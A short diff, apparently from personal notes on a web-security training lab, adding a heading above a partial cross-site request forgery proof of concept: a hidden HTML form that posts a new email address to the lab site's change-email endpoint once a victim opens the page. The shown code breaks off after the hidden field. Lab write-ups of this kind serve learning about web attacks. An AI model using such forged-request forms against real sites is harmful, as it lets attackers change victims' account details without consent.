@@ -1,5 +1,6 @@
 GOAL: execute simple CSRF attack by getting victim to click on page with the below code to redirect to valid website and change email address
 
+#HTML code
 
     <form action="https://ac601f281ef7843fc0f7831f004200ee.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="some@email.com"/> 
